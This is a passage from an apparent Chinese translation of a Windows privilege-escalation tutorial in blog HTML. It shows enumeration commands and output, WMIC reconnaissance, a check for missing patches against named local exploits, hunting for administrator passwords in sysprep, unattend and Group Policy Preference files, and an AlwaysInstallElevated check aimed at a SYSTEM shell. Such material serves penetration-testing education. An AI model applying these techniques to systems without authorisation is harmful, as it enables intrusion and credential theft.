Retry For 240 minutes</span><br><span class="line">Power Management:                     No Start On Batteries</span><br><span class="line">Run As User:                          SYSTEM</span><br><span class="line">Delete Task If Not Rescheduled:       Enabled</span><br><span class="line">Stop Task If Runs X Hours and X Mins: 72:00:00</span><br><span class="line">Schedule:                             Scheduling data is not available in this format.</span><br><span class="line">Schedule Type:                        Daily</span><br><span class="line">Start Time:                           5:11:13 AM</span><br><span class="line">Start Date:                           1/1/2000</span><br><span class="line">End Date:                             1/1/2100</span><br><span class="line">Days:                                 Every 1 day(s)</span><br><span class="line">Months:                               N/A</span><br><span class="line">Repeat: Every:                        Disabled</span><br><span class="line">Repeat: Until: Time:                  Disabled</span><br><span class="line">Repeat: Until: Duration:              Disabled</span><br><span class="line">Repeat: Stop If Still Running:        Disabled</span><br><span class="line">[..Snip..]</span><br><span class="line"></span><br><span class="line"># The following command links running processes to started services.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; tasklist /SVC</span><br><span class="line"></span><br><span class="line">Image Name                     PID Services</span><br><span class="line">========================= ======== ============================================</span><br><span class="line">System Idle Process              0 N/A</span><br><span class="line">System                           4 N/A</span><br><span class="line">smss.exe                       244 N/A</span><br><span class="line">csrss.exe                      332 N/A</span><br><span class="line">csrss.exe                      372 N/A</span><br><span class="line">wininit.exe                    380 N/A</span><br><span class="line">winlogon.exe                   428 N/A</span><br><span class="line">services.exe                   476 N/A</span><br><span class="line">lsass.exe                      484 SamSs</span><br><span class="line">lsm.exe                        496 N/A</span><br><span class="line">svchost.exe                    588 DcomLaunch, PlugPlay, Power</span><br><span class="line">svchost.exe                    668 RpcEptMapper, RpcSs</span><br><span class="line">svchost.exe                    760 Audiosrv, Dhcp, eventlog,</span><br><span class="line">                                   HomeGroupProvider, lmhosts, wscsvc</span><br><span class="line">svchost.exe                    800 AudioEndpointBuilder, CscService, Netman,</span><br><span class="line">                                   SysMain, TrkWks, UxSms, WdiSystemHost,</span><br><span class="line">                                   wudfsvc</span><br><span class="line">svchost.exe                    836 AeLookupSvc, BITS, gpsvc, iphlpsvc,</span><br><span class="line">                                   LanmanServer, MMCSS, ProfSvc, Schedule,</span><br><span class="line">                                   seclogon, SENS, ShellHWDetection, Themes,</span><br><span class="line">                                   Winmgmt, wuauserv</span><br><span class="line">audiodg.exe                    916 N/A</span><br><span class="line">svchost.exe                    992 EventSystem, fdPHost, netprofm, nsi,</span><br><span class="line">                                   WdiServiceHost, WinHttpAutoProxySvc</span><br><span class="line">svchost.exe                   1104 CryptSvc, Dnscache, LanmanWorkstation,</span><br><span class="line">                                   NlaSvc</span><br><span class="line">spoolsv.exe                   1244 Spooler</span><br><span class="line">svchost.exe                   1272 BFE, DPS, MpsSvc</span><br><span class="line">mDNSResponder.exe             1400 Bonjour Service</span><br><span class="line">taskhost.exe                  1504 N/A</span><br><span class="line">taskeng.exe                   1556 N/A</span><br><span class="line">vmtoolsd.exe                  1580 VMTools</span><br><span class="line">dwm.exe                       1660 N/A</span><br><span class="line">explorer.exe                  1668 N/A</span><br><span class="line">vmware-usbarbitrator.exe      1768 VMUSBArbService</span><br><span class="line">TPAutoConnSvc.exe             1712 TPAutoConnSvc</span><br><span class="line">[..Snip..]</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; net start</span><br><span class="line"></span><br><span class="line">These Windows services are started:</span><br><span class="line"></span><br><span class="line">   Application Experience</span><br><span class="line">   Application Information</span><br><span class="line">   Background Intelligent Transfer Service</span><br><span class="line">   Base Filtering Engine</span><br><span class="line">   Bluetooth Support Service</span><br><span class="line">   Bonjour Service</span><br><span class="line">   COM+ Event System</span><br><span class="line">   COM+ System Application</span><br><span class="line">   Cryptographic Services</span><br><span class="line">   DCOM Server Process Launcher</span><br><span class="line">   Desktop Window Manager Session Manager</span><br><span class="line">   DHCP Client</span><br><span class="line">   Diagnostic Policy Service</span><br><span class="line">   Diagnostic Service Host</span><br><span class="line">   Diagnostic System Host</span><br><span class="line">   Distributed Link Tracking Client</span><br><span class="line">   Distributed Transaction Coordinator</span><br><span class="line">   DNS Client</span><br><span class="line">   Function Discovery Provider Host</span><br><span class="line">   Function Discovery Resource Publication</span><br><span class="line">   Group Policy Client</span><br><span class="line">[..Snip..]</span><br><span class="line">   </span><br><span class="line"># This can be useful sometimes as some 3rd party drivers, even by reputable companies, contain more holes</span><br><span class="line">than Swiss cheese. This is only possible because ring0 exploitation lies outside most peoples expertise.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; DRIVERQUERY</span><br><span class="line"></span><br><span class="line">Module Name  Display Name           Driver Type   Link Date</span><br><span class="line">============ ====================== ============= ======================</span><br><span class="line">1394ohci     1394 OHCI Compliant Ho Kernel        11/20/2010 6:01:11 PM</span><br><span class="line">ACPI         Microsoft ACPI Driver  Kernel        11/20/2010 4:37:52 PM</span><br><span class="line">AcpiPmi      ACPI Power Meter Drive Kernel        11/20/2010 4:47:55 PM</span><br><span class="line">adp94xx      adp94xx                Kernel        12/6/2008 7:59:55 AM</span><br><span class="line">adpahci      adpahci                Kernel        5/2/2007 1:29:26 AM</span><br><span class="line">adpu320      adpu320                Kernel        2/28/2007 8:03:08 AM</span><br><span class="line">AFD          Ancillary Function Dri Kernel        11/20/2010 4:40:00 PM</span><br><span class="line">agp440       Intel AGP Bus Filter   Kernel        7/14/2009 7:25:36 AM</span><br><span class="line">aic78xx      aic78xx                Kernel        4/12/2006 8:20:11 AM</span><br><span class="line">aliide       aliide                 Kernel        7/14/2009 7:11:17 AM</span><br><span class="line">amdagp       AMD AGP Bus Filter Dri Kernel        7/14/2009 7:25:36 AM</span><br><span class="line">amdide       amdide                 Kernel        7/14/2009 7:11:19 AM</span><br><span class="line">AmdK8        AMD K8 Processor Drive Kernel        7/14/2009 7:11:03 AM</span><br><span class="line">AmdPPM       AMD Processor Driver   Kernel        7/14/2009 7:11:03 AM</span><br><span class="line">amdsata      amdsata                Kernel        3/19/2010 9:08:27 AM</span><br><span class="line">amdsbs       amdsbs                 Kernel        3/21/2009 2:35:26 AM</span><br><span class="line">amdxata      amdxata                Kernel        3/20/2010 12:19:01 AM</span><br><span class="line">AppID        AppID Driver           Kernel        11/20/2010 5:29:48 PM</span><br><span class="line">arc          arc                    Kernel        5/25/2007 5:31:06 AM</span><br><span class="line">[..Snip..]</span><br></pre></td></tr></table></figure>
<h2 id="Δt-for-t4-WMIC的奥术艺术"><a href="#Δt-for-t4-WMIC的奥术艺术" class="headerlink" title="Δt for t4 - WMIC的奥术艺术"></a>Δt for t4 - WMIC的奥术艺术</h2><p>  我想分别提到WMIC（Windows Management Instrumentation命令行），因为它是Windows最有用的命令行工具。WIMIC对于信息收集和后期开发非常实用。据说它有点笨重，输出还有很多不足之处。</p>
<p>完全解释WMIC的使用将采用它自己的全部教程。更不用说由于格式化，一些输出将难以显示。</p>
<p>我在下面列出了两个非常值得阅读的资源：<br>Command-Line Ninjitsu（SynJunkie） - <a href="http://synjunkie.blogspot.com/2008/03/command-line-ninjitsu.html" target="_blank" rel="noopener">这里是</a><br>Windows WMIC命令行（ComputerHope） - <a href="http://www.computerhope.com/wmic.htm" target="_blank" rel="noopener">这里</a></p>
<p>不幸的是，除非用户在Administrators组中，否则某些Windows默认配置不允许访问WMIC（这可能是一个非常好的主意）。从我对VM的测试中我注意到，任何版本的XP都不允许从低权限帐户访问WMIC。相反，Windows 7 Professional和Windows 8 Enterprise的默认安装允许低权限用户使用WMIC并查询操作系统而无需修改任何设置。这正是我们使用WMIC收集有关目标机器的信息所需要的。</p>
<p>为了让您了解WMIC提供的广泛选项，我已在下面列出了可用的命令行开关。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt; wmic /?</span><br><span class="line"></span><br><span class="line">[global switches] </span><br><span class="line"></span><br><span class="line">The following global switches are available:</span><br><span class="line">/NAMESPACE           Path for the namespace the alias operate against.</span><br><span class="line">/ROLE                Path for the role containing the alias definitions.</span><br><span class="line">/NODE                Servers the alias will operate against.</span><br><span class="line">/IMPLEVEL            Client impersonation level.</span><br><span class="line">/AUTHLEVEL           Client authentication level.</span><br><span class="line">/LOCALE              Language id the client should use.</span><br><span class="line">/PRIVILEGES          Enable or disable all privileges.</span><br><span class="line">/TRACE               Outputs debugging information to stderr.</span><br><span class="line">/RECORD              Logs all input commands and output.</span><br><span class="line">/INTERACTIVE         Sets or resets the interactive mode.</span><br><span class="line">/FAILFAST            Sets or resets the FailFast mode.</span><br><span class="line">/USER                User to be used during the session.</span><br><span class="line">/PASSWORD            Password to be used for session login.</span><br><span class="line">/OUTPUT              Specifies the mode for output redirection.</span><br><span class="line">/APPEND              Specifies the mode for output redirection.</span><br><span class="line">/AGGREGATE           Sets or resets aggregate mode.</span><br><span class="line">/AUTHORITY           Specifies the  for the connection.</span><br><span class="line">/?[:&lt;BRIEF|FULL&gt;]    Usage information.</span><br><span class="line"></span><br><span class="line">For more information on a specific global switch, type: switch-name /?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The following alias/es are available in the current role:</span><br><span class="line">ALIAS                    - Access to the aliases available on the local system</span><br><span class="line">BASEBOARD                - Base board (also known as a motherboard or system board) management.</span><br><span class="line">BIOS                     - Basic input/output services (BIOS) management.</span><br><span class="line">BOOTCONFIG               - Boot configuration management.</span><br><span class="line">CDROM                    - CD-ROM management.</span><br><span class="line">COMPUTERSYSTEM           - Computer system management.</span><br><span class="line">CPU                      - CPU management.</span><br><span class="line">CSPRODUCT                - Computer system product information from SMBIOS.</span><br><span class="line">DATAFILE                 - DataFile Management.</span><br><span class="line">DCOMAPP                  - DCOM Application management.</span><br><span class="line">DESKTOP                  - User&apos;s Desktop management.</span><br><span class="line">DESKTOPMONITOR           - Desktop Monitor management.</span><br><span class="line">DEVICEMEMORYADDRESS      - Device memory addresses management.</span><br><span class="line">DISKDRIVE                - Physical disk drive management.</span><br><span class="line">DISKQUOTA                - Disk space usage for NTFS volumes.</span><br><span class="line">DMACHANNEL               - Direct memory access (DMA) channel management.</span><br><span class="line">ENVIRONMENT              - System environment settings management.</span><br><span class="line">FSDIR                    - Filesystem directory entry management.</span><br><span class="line">GROUP                    - Group account management.</span><br><span class="line">IDECONTROLLER            - IDE Controller management.</span><br><span class="line">IRQ                      - Interrupt request line (IRQ) management.</span><br><span class="line">JOB                      - Provides  access to the jobs scheduled using the schedule service.</span><br><span class="line">LOADORDER                - Management of system services that define execution dependencies.</span><br><span class="line">LOGICALDISK              - Local storage device management.</span><br><span class="line">LOGON                    - LOGON Sessions.</span><br><span class="line">MEMCACHE                 - Cache memory management.</span><br><span class="line">MEMORYCHIP               - Memory chip information.</span><br><span class="line">MEMPHYSICAL              - Computer system&apos;s physical memory management.</span><br><span class="line">NETCLIENT                - Network Client management.</span><br><span class="line">NETLOGIN                 - Network login information (of a particular user) management.</span><br><span class="line">NETPROTOCOL              - Protocols (and their network characteristics) management.</span><br><span class="line">NETUSE                   - Active network connection management.</span><br><span class="line">NIC                      - Network Interface Controller (NIC) management.</span><br><span class="line">NICCONFIG                - Network adapter management.</span><br><span class="line">NTDOMAIN                 - NT Domain management.</span><br><span class="line">NTEVENT                  - Entries in the NT Event Log.</span><br><span class="line">NTEVENTLOG               - NT eventlog file management.</span><br><span class="line">ONBOARDDEVICE            - Management of common adapter devices built into the motherboard (system board).</span><br><span class="line">OS                       - Installed Operating System/s management.</span><br><span class="line">PAGEFILE                 - Virtual memory file swapping management.</span><br><span class="line">PAGEFILESET              - Page file settings management.</span><br><span class="line">PARTITION                - Management of partitioned areas of a physical disk.</span><br><span class="line">PORT                     - I/O port management.</span><br><span class="line">PORTCONNECTOR            - Physical connection ports management.</span><br><span class="line">PRINTER                  - Printer device management.</span><br><span class="line">PRINTERCONFIG            - Printer device configuration management.</span><br><span class="line">PRINTJOB                 - Print job management.</span><br><span class="line">PROCESS                  - Process management.</span><br><span class="line">PRODUCT                  - Installation package task management.</span><br><span class="line">QFE                      - Quick Fix Engineering.</span><br><span class="line">QUOTASETTING             - Setting information for disk quotas on a volume.</span><br><span class="line">RDACCOUNT                - Remote Desktop connection permission management.</span><br><span class="line">RDNIC                    - Remote Desktop connection management on a specific network adapter.</span><br><span class="line">RDPERMISSIONS            - Permissions to a specific Remote Desktop connection.</span><br><span class="line">RDTOGGLE                 - Turning Remote Desktop listener on or off remotely.</span><br><span class="line">RECOVEROS                - Information that will be gathered from memory when the operating system fails.</span><br><span class="line">REGISTRY                 - Computer system registry management.</span><br><span class="line">SCSICONTROLLER           - SCSI Controller management.</span><br><span class="line">SERVER                   - Server information management.</span><br><span class="line">SERVICE                  - Service application management.</span><br><span class="line">SHADOWCOPY               - Shadow copy management.</span><br><span class="line">SHADOWSTORAGE            - Shadow copy storage area management.</span><br><span class="line">SHARE                    - Shared resource management.</span><br><span class="line">SOFTWAREELEMENT          - Management of the  elements of a software product installed on a system.</span><br><span class="line">SOFTWAREFEATURE          - Management of software product subsets of SoftwareElement.</span><br><span class="line">SOUNDDEV                 - Sound Device management.</span><br><span class="line">STARTUP                  - Management of commands that run automatically when users log onto the computer </span><br><span class="line">                           system.</span><br><span class="line">SYSACCOUNT               - System account management.</span><br><span class="line">SYSDRIVER                - Management of the system driver for a base service.</span><br><span class="line">SYSTEMENCLOSURE          - Physical system enclosure management.</span><br><span class="line">SYSTEMSLOT               - Management of physical connection points including ports,  slots and </span><br><span class="line">                           peripherals, and proprietary connections points.</span><br><span class="line">TAPEDRIVE                - Tape drive management.</span><br><span class="line">TEMPERATURE              - Data management of a temperature sensor (electronic thermometer).</span><br><span class="line">TIMEZONE                 - Time zone data management.</span><br><span class="line">UPS                      - Uninterruptible power supply (UPS) management.</span><br><span class="line">USERACCOUNT              - User account management.</span><br><span class="line">VOLTAGE                  - Voltage sensor (electronic voltmeter) data management.</span><br><span class="line">VOLUME                   - Local storage volume management.</span><br><span class="line">VOLUMEQUOTASETTING       - Associates the disk quota setting with a specific disk volume.</span><br><span class="line">VOLUMEUSERQUOTA          - Per user storage volume quota management.</span><br><span class="line">WMISET                   - WMI service operational parameters management.</span><br><span class="line"></span><br><span class="line">For more information on a specific alias, type: alias /?</span><br><span class="line"></span><br><span class="line">CLASS     - Escapes to full WMI schema.</span><br><span class="line">PATH      - Escapes to full WMI object paths.</span><br><span class="line">CONTEXT   - Displays the state of all the global switches.</span><br><span class="line">QUIT/EXIT - Exits the program.</span><br><span class="line"></span><br><span class="line">For more information on CLASS/PATH/CONTEXT, type: (CLASS | PATH | CONTEXT) /?</span><br></pre></td></tr></table></figure>
<p>  为简化起见，我创建了一个可以在目标机器上删除的脚本，该脚本将使用WMIC提取以下信息：进程，服务，用户帐户，用户组，网络接口，硬盘驱动器信息，网络共享信息，已安装的Windows补丁程序，启动时运行的程序，已安装软件的列表，有关操作系统和时区的信息。</p>
<p>如果有人想到应该添加到列表中的内容，我已经浏览了各种标志和参数来提取有价值的信息，请在下面留言。使用内置输出功能，脚本会将所有结果写入人类可读的html文件。</p>
<p>你可以<a href="http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar" target="_blank" rel="noopener">在这里</a>下载我的脚本（wmic_info.bat）<br>Windows 7 VM上的示例输出文件（严重修补） - <a href="http://www.fuzzysecurity.com/tutorials/files/Win7.html" target="_blank" rel="noopener">此处</a></p>
<h2 id="Δt-for-t5-to-t6-快速失败"><a href="#Δt-for-t5-to-t6-快速失败" class="headerlink" title="Δt for t5 to t6 - 快速失败"></a>Δt for t5 to t6 - 快速失败</h2><p>  在继续之前，您应该花一点时间来查看您收集的信息，到目前为止应该有很多。我们的游戏计划的下一步是寻找一些快速安全性失败，可以轻松利用它来升级我们的用户权限。</p>
<p>我们需要关注的第一个也是最明显的事情是补丁级别。如果我们发现主机被严重修补，则无需进一步担心。我的WMIC脚本已经列出了所有已安装的补丁，但您可以在下面看到示例命令行输出。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt; wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line"></span><br><span class="line">Caption                                     Description      HotFixID   InstalledOn</span><br><span class="line">http://support.microsoft.com/?kbid=2727528  Security Update  KB2727528  11/23/2013</span><br><span class="line">http://support.microsoft.com/?kbid=2729462  Security Update  KB2729462  11/26/2013</span><br><span class="line">http://support.microsoft.com/?kbid=2736693  Security Update  KB2736693  11/26/2013</span><br><span class="line">http://support.microsoft.com/?kbid=2737084  Security Update  KB2737084  11/23/2013</span><br><span class="line">http://support.microsoft.com/?kbid=2742614  Security Update  KB2742614  11/23/2013</span><br><span class="line">http://support.microsoft.com/?kbid=2742616  Security Update  KB2742616  11/26/2013</span><br><span class="line">http://support.microsoft.com/?kbid=2750149  Update           KB2750149  11/23/2013</span><br><span class="line">http://support.microsoft.com/?kbid=2756872  Update           KB2756872  11/24/2013</span><br><span class="line">http://support.microsoft.com/?kbid=2756923  Security Update  KB2756923  11/26/2013</span><br><span class="line">http://support.microsoft.com/?kbid=2757638  Security Update  KB2757638  11/23/2013</span><br><span class="line">http://support.microsoft.com/?kbid=2758246  Update           KB2758246  11/24/2013</span><br><span class="line">http://support.microsoft.com/?kbid=2761094  Update           KB2761094  11/24/2013</span><br><span class="line">http://support.microsoft.com/?kbid=2764870  Update           KB2764870  11/24/2013</span><br><span class="line">http://support.microsoft.com/?kbid=2768703  Update           KB2768703  11/23/2013</span><br><span class="line">http://support.microsoft.com/?kbid=2769034  Update           KB2769034  11/23/2013</span><br><span class="line">http://support.microsoft.com/?kbid=2769165  Update           KB2769165  11/23/2013</span><br><span class="line">http://support.microsoft.com/?kbid=2769166  Update           KB2769166  11/26/2013</span><br><span class="line">http://support.microsoft.com/?kbid=2770660  Security Update  KB2770660  11/23/2013</span><br><span class="line">http://support.microsoft.com/?kbid=2770917  Update           KB2770917  11/24/2013</span><br><span class="line">http://support.microsoft.com/?kbid=2771821  Update           KB2771821  11/24/2013</span><br><span class="line">[..Snip..]</span><br></pre></td></tr></table></figure>
<p>  与Windows一样，输出并不完全可以使用。最好的策略是查找权限提升漏洞并查找各自的KB补丁号。此类攻击包括但不限于KiTrap0D（KB979682），MS11-011（KB2393802），MS10-059（KB982799），MS10-021（KB979683），MS11-080（KB2592799）。在枚举操作系统版本和Service Pack之后，您应该找出可能存在哪些权限升级漏洞。使用KB修补程序编号，您可以grep已安装的修补程序以查看是否缺少任何修补程序。</p>
<p>您可以在下面看到grep补丁的语法：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt; wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot; /C:&quot;KB..&quot;</span><br></pre></td></tr></table></figure>
<p>  接下来我们将看看大规模推出。如果存在需要安装许多机器的环境，通常，技术人员不会在机器之间四处走动。有几种解决方案可以自动安装机器。这些方法是什么以及它们如何工作对我们的目的来说不那么重要，但主要的是它们留下了用于安装过程的配置文件。这些配置文件包含许多敏感的敏感信息，例如操作系统产品密钥和管理员密码。我们最感兴趣的是管理员密码，因为我们可以使用它来提升我们的权限。</p>
<p>通常这些是包含配置文件的目录（但检查整个操作系统是个好主意）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c:\sysprep.inf</span><br><span class="line">c:\sysprep\sysprep.xml </span><br><span class="line">％WINDIR％\Panther\Unattend\Unattended.xml </span><br><span class="line">％WINDIR％\Panther\Unattended.xml</span><br></pre></td></tr></table></figure>
<p>这些文件包含明文密码或Base64编码格式。您可以在下面看到一些示例文件输出。  </p>
<figure class="highlight plain"><figcaption><span>This is a sample from sysprep.inf with clear-text credentials.</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># This is a sample from sysprep.inf with clear-text credentials.</span><br><span class="line"></span><br><span class="line">[GuiUnattended]</span><br><span class="line">OEMSkipRegional=1</span><br><span class="line">OemSkipWelcome=1</span><br><span class="line">AdminPassword=s3cr3tp4ssw0rd</span><br><span class="line">TimeZone=20</span><br><span class="line"></span><br><span class="line"># This is a sample from sysprep.xml with Base64 &quot;encoded&quot; credentials. Please people Base64 is not</span><br><span class="line">encryption, I take more precautions to protect my coffee. The password here is &quot;SuperSecurePassword&quot;.</span><br><span class="line"></span><br><span class="line">&lt;LocalAccounts&gt;</span><br><span class="line">    &lt;LocalAccount wcm:action=&quot;add&quot;&gt;</span><br><span class="line">        &lt;Password&gt;</span><br><span class="line">            &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;/Value&gt;</span><br><span class="line">            &lt;PlainText&gt;false&lt;/PlainText&gt;</span><br><span class="line">        &lt;/Password&gt;</span><br><span class="line">        &lt;Description&gt;Local Administrator&lt;/Description&gt;</span><br><span class="line">        &lt;DisplayName&gt;Administrator&lt;/DisplayName&gt;</span><br><span class="line">        &lt;Group&gt;Administrators&lt;/Group&gt;</span><br><span class="line">        &lt;Name&gt;Administrator&lt;/Name&gt;</span><br><span class="line">    &lt;/LocalAccount&gt;</span><br><span class="line">&lt;/LocalAccounts&gt;</span><br><span class="line"></span><br><span class="line"># Sample from Unattended.xml with the same &quot;secure&quot; Base64 encoding.</span><br><span class="line"></span><br><span class="line">&lt;AutoLogon&gt;</span><br><span class="line">    &lt;Password&gt;</span><br><span class="line">        &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;/Value&gt;</span><br><span class="line">        &lt;PlainText&gt;false&lt;/PlainText&gt;</span><br><span class="line">    &lt;/Password&gt;</span><br><span class="line">    &lt;Enabled&gt;true&lt;/Enabled&gt;</span><br><span class="line">    &lt;Username&gt;Administrator&lt;/Username&gt;</span><br><span class="line">&lt;/AutoLogon&gt;</span><br></pre></td></tr></table></figure>
<p>根据Ben Campbell（<a href="https://twitter.com/Meatballs__" target="_blank" rel="noopener">@Meatballs__</a>）的推荐，我将组策略首选项保存的密码添加到快速失败列表中。GPO首选项文件可用于在域计算机上创建本地用户。当您妥协的框连接到域时，非常值得查找存储在SYSVOL中的Groups.xml文件。任何经过身份验证的用户都具有对此文件的读取权限。xml文件中的密码通过使用AES加密来从临时用户“隐藏”，我说模糊，因为静态密钥在msdn网站上发布，允许轻松解密存储的值。</p>
<p>除了Groups.xml之外，其他几个策略首选项文件还可以设置可选的“cPassword”属性：<br>Services \ Services.xml：<a href="http://msdn.microsoft.com/en-us/library/cc980070.aspx" target="_blank" rel="noopener">特定于元素的属性</a><br>ScheduledTasks \ ScheduledTasks.xml：<a href="http://msdn.microsoft.com/en-us/library/cc422920.aspx" target="_blank" rel="noopener">任务内部元素</a>，<a href="http://msdn.microsoft.com/en-us/library/dd341350.aspx" target="_blank" rel="noopener">TaskV2内部元素</a>，<a href="http://msdn.microsoft.com/en-us/library/dd304114.aspx" target="_blank" rel="noopener">ImmediateTaskV2内部元素</a><br>打印机\ Printers.xml：<a href="http://msdn.microsoft.com/en-us/library/cc422918.aspx" target="_blank" rel="noopener">SharedPrinter元素</a><br>驱动器\ Drives.xml：<a href="http://msdn.microsoft.com/en-us/library/cc704598.aspx" target="_blank" rel="noopener">元素特定属性</a><br>DataSources \ DataSources.xml：<a href="http://msdn.microsoft.com/en-us/library/cc422926.aspx" target="_blank" rel="noopener">元素特定属性</a></p>
<p>可以通过手动浏览SYSVOL并抓取相关文件来利用此漏洞，如下所示。</p>
<p><img src="http://www.fuzzysecurity.com/tutorials/images/priv06_big.png" alt="img"></p>
<p>然而，我们都喜欢自动化解决方案，因此我们可以尽快到达终点。这里有两个主要选项，具体取决于我们拥有的shell /访问类型。有（1）metasploit模块可以通过<a href="https://www.rapid7.com/db/modules/post/windows/gather/credentials/gpp" target="_blank" rel="noopener">此处</a>建立的会话执行<a href="https://www.rapid7.com/db/modules/post/windows/gather/credentials/gpp" target="_blank" rel="noopener">，</a>或者（2）您可以使用Get-GPPPassword，它是<a href="https://github.com/mattifestation/PowerSploit" target="_blank" rel="noopener">PowerSploit的</a>一部分。PowerSploit是Matt Graeber的优秀PowerShell框架，专为逆向工程，取证和测试而量身定制。</p>
<p>接下来我们将寻找一个奇怪的注册表设置“AlwaysInstallElevated”，如果启用此设置，它允许任何权限级别的用户将* .msi文件安装为NT AUTHORITY \ SYSTEM。对我来说，创建低权限用户（限制他们使用操作系统）但让他们能够以SYSTEM身份安装程序似乎是一个奇怪的想法。有关此问题的更多背景阅读，您可以在<a href="http://www.greyhathacker.net/?p=185" target="_blank" rel="noopener">这里查看</a>来自GreyHatHacker的Parvez的一篇文章，该文章最初将此报告为安全问题。</p>
<p>为了能够使用它，我们需要检查是否设置了两个注册表项，如果是这种情况我们可以弹出一个SYSTEM shell。您可以看到sytntax查询下面的相应注册表项。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># This will only work if both registry keys contain &quot;AlwaysInstallElevated&quot; with DWORD values of 1.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</span><br><span class="line">C:\Windows\system32&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</span><br></pre></td></tr></table></figure>
<p>为了完成这一部分，我们将对操作系统进行一些快速搜索，希望我们能够获得金牌。您可以在下面看到我们搜索的语法。</p>
